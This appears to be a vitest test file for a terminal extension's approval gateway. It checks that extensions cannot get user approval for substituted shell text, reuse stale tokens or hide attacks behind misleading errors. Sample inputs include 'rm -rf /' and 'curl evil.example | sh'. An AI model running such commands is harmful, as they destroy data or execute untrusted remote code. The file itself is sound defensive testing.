// Approval binding, tested against the three holes adversarial review found.
//
// The gateway's central promise is that an extension never writes to a shell: it can
// only *request* permission for text the user selected, and the user grants it. Each
// of these tests corresponds to a way that promise was not actually kept.

import { describe, expect, it, vi } from 'vitest'
import { ApprovalBook } from './approval-book'
import { createHash } from './hash-text'
import { CapabilityGateway, type ExtensionGrant, type GatewayHost } from './capability-gateway'

function grant(overrides: Partial<ExtensionGrant> = {}): ExtensionGrant {
  return {
    extensionId: 'snippet-dock',
    capabilities: ['terminal.read-selected'],
    generation: 1,
    enabled: true,
    failed: false,
    ...overrides,
  }
}

function host(overrides: Partial<GatewayHost> = {}): GatewayHost {
  return {
    visibleSessionId: () => 'tab-1',
    selectedText: () => ({ text: 'kubectl get pods', selectionId: 'sel-1', sessionId: 'tab-1' }),
    ...overrides,
  }
}

function gateway(options: { grant?: ExtensionGrant, host?: GatewayHost, now?: () => number } = {}) {
  return new CapabilityGateway(
    () => options.grant ?? grant(),
    options.host ?? host(),
    options.now ?? (() => 1_000),
  )
}

describe('the hash binds the exact text, and a stronger one was needed', () => {
  it('a different string with the same 32-bit FNV value must not pass', () => {
    // The original used FNV-1a over UTF-16 code units — 32 bits, non-cryptographic.
    // The text is supplied by the extension on both sides (it passes `intent.text`
    // when asking and again when redeeming), so a collision is not a curiosity: it
    // is a way to get "rm -rf /" approved under a token minted for "ls".
    //
    // This test does not require finding a collision by brute force; it asserts the
    // property that makes collisions irrelevant — the comparison is over the full
    // text, not over a fixed-width digest.
    const a = 'ls'
    const b = 'rm -rf /'
    expect(createHash(a)).not.toBe(createHash(b))
    // And the digest is wide enough that a targeted search is out of reach: 128 bits
    // hex, not 8.
    expect(createHash(a).length).toBeGreaterThanOrEqual(32)
  })
})

describe('requestSendText must name the selection the user made', () => {
  it('refuses text that differs from the current selection', async () => {
    // The hole: it checked only that *some* selection existed, then minted a token
    // for whatever `intent.text` said. An extension could read 'ls', then request
    // approval for 'curl evil | sh' and get a token — the user would be approving
    // text they never saw.
    const subject = gateway()
    const result = await subject.requestSendText('snippet-dock', 1, {
      sessionId: 'tab-1',
      text: 'curl evil.example | sh',
    })
    expect(result).toEqual({ approved: false, reason: 'not-the-selection' })
  })

  it('approves the text that is actually selected', async () => {
    const subject = gateway()
    const result = await subject.requestSendText('snippet-dock', 1, {
      sessionId: 'tab-1',
      text: 'kubectl get pods',
    })
    expect(result.approved).toBe(true)
  })

  it('binds the token to the selection id, so a new selection cannot reuse it', async () => {
    // Approve one selection, then the user highlights something else and the
    // extension redeems the old token for the new text. Same session, same text
    // length even — only the selection identity distinguishes them.
    let selection = { text: 'ls', selectionId: 'sel-1', sessionId: 'tab-1' }
    const subject = gateway({
      host: host({ selectedText: () => selection }),
    })
    const minted = await subject.requestSendText('snippet-dock', 1, {
      sessionId: 'tab-1',
      text: 'ls',
    })
    const token = minted.approved ? minted.token : ''

    selection = { text: 'ls', selectionId: 'sel-2', sessionId: 'tab-1' }
    expect(() => subject.consumeApproval(token, 'snippet-dock', 1, 'ls')).toThrow()
  })
})

describe('consumeApproval re-checks the world it is redeeming into', () => {
  it('refuses when the extension was deactivated after minting', async () => {
    // The hole: `consumeApproval` never called `authorize`, so registration, enabled,
    // failed and generation were all skipped. A token minted before a deactivate, or
    // before a callback failure, stayed redeemable indefinitely.
    let current = grant()
    const subject = new CapabilityGateway(() => current, host(), () => 1_000)
    const minted = await subject.requestSendText('snippet-dock', 1, {
      sessionId: 'tab-1',
      text: 'kubectl get pods',
    })
    const token = minted.approved ? minted.token : ''

    current = grant({ enabled: false })
    expect(() => subject.consumeApproval(token, 'snippet-dock', 1, 'kubectl get pods')).toThrow()
  })

  it('refuses when the extension is now failed', async () => {
    let current = grant()
    const subject = new CapabilityGateway(() => current, host(), () => 1_000)
    const minted = await subject.requestSendText('snippet-dock', 1, {
      sessionId: 'tab-1',
      text: 'kubectl get pods',
    })
    const token = minted.approved ? minted.token : ''

    current = grant({ failed: true })
    expect(() => subject.consumeApproval(token, 'snippet-dock', 1, 'kubectl get pods')).toThrow()
  })

  it('refuses when the user has switched to a different session', async () => {
    // The approval named a session. If the user is now looking at another host, the
    // write would land somewhere they are not watching.
    let visible = 'tab-1'
    const subject = gateway({
      host: {
        visibleSessionId: () => visible,
        selectedText: () => ({ text: 'kubectl get pods', selectionId: 'sel-1', sessionId: 'tab-1' }),
      },
    })
    const minted = await subject.requestSendText('snippet-dock', 1, {
      sessionId: 'tab-1',
      text: 'kubectl get pods',
    })
    const token = minted.approved ? minted.token : ''

    visible = 'tab-2'
    expect(() => subject.consumeApproval(token, 'snippet-dock', 1, 'kubectl get pods')).toThrow()
  })
})

describe('approval book', () => {
  it('treats a selection id change as a different approval', () => {
    const book = new ApprovalBook(() => 1_000)
    const token = book.mint({
      extensionId: 'x',
      generation: 1,
      sessionId: 'tab-1',
      selectionId: 'sel-1',
      text: 'ls',
    })
    expect(() =>
      book.consume({
        token,
        extensionId: 'x',
        generation: 1,
        text: 'ls',
        selectionId: 'sel-2',
        visibleSessionId: 'tab-1',
      }),
    ).toThrow()
  })
})

describe('a failure while redeeming does not report the wrong reason', () => {
  it('distinguishes text mismatch from expiry', async () => {
    // The hole: every non-'already-used' failure was rethrown as 'approval-expired',
    // so a substituted-text attempt looked like an expired token — hiding an attack
    // behind a mundane explanation, in logs and in whatever the host reports.
    const subject = gateway()
    const minted = await subject.requestSendText('snippet-dock', 1, {
      sessionId: 'tab-1',
      text: 'kubectl get pods',
    })
    const token = minted.approved ? minted.token : ''

    let denial = ''
    try {
      subject.consumeApproval(token, 'snippet-dock', 1, 'something else entirely')
    } catch (error) {
      denial = (error as { denial?: string }).denial ?? ''
    }
    expect(denial).not.toBe('approval-expired')
    expect(denial).toBe('approval-mismatch')
  })
})

void vi
